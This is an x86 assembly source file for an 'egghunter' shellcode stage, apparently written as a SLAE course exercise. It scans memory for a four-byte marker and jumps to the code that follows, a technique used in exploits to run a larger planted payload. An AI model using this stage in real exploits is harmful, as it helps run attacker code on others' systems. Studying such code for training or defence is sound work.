; Shellcode Title: Egghunter 01
; Date: 20-02-2018
; Student Id: SLAE-1058
; Tested on: Ubuntu 12.04 LTS x86

global _start
section .text

_start:
	mov eax, start_addr
	
	; move our MARK to EBX
	mov ebx, dword 0x50905091
	; get 0x50905090 in EBX (prevent to find by itself)
	dec ebx

nextaddr:
	; search for the mark
	inc eax
	cmp dword [eax], ebx
	jne nextaddr

	; execute the shellcode
	jmp eax

start_addr: db 0x01
